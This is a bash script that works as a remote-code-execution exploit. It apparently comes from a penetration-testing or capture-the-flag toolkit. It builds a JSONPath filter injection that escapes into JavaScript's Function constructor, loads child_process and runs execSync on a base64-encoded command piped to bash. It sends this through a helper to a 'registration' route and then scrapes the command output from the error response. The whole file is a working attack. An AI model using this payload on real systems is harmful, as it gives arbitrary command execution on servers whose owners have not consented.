#!/usr/bin/env bash
set -euo pipefail

source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"

(( $# == 2 )) || {
  printf 'Usage: %s LABEL COMMAND\n' "$0" >&2
  exit 2
}

label="$1"
command_text="$2"
[[ "$label" =~ ^[A-Za-z0-9._-]+$ ]] || exit 2

wrapped="printf '__RCE_BEGIN__\\n'; { $command_text; } 2>&1; printf '\\n__RCE_END__\\n'"
encoded=$(printf '%s' "$wrapped" | base64 -w0)
expr="\$..[?(p=\"throw Error(this.process.mainModule.require('child_process').execSync('echo $encoded|base64 -d|bash').toString())\";a=''[['constructor']][['constructor']](p);a())]"

if (( ${#expr} > 512 )); then
  printf 'encoded expression is %d bytes; route limit is 512\n' "${#expr}" >&2
  exit 2
fi

"$script_dir/jpquery.sh" "$label" registration "$expr" >/dev/null
body="$odyssey_root/responses/jpquery-$label.body"
output="$odyssey_root/responses/jpquery-$label.output"
jq -r '.detail // empty' "$body" |
  sed -n '/__RCE_BEGIN__/,/__RCE_END__/p' |
  sed '1s/^.*__RCE_BEGIN__//' |
  sed '$s/__RCE_END__.*$//' > "$output"

printf 'status=%s expression_bytes=%d output=%s\n' \
  "$(awk 'NR==1{print $2}' "$odyssey_root/responses/jpquery-$label.headers")" \
  "${#expr}" "$output"
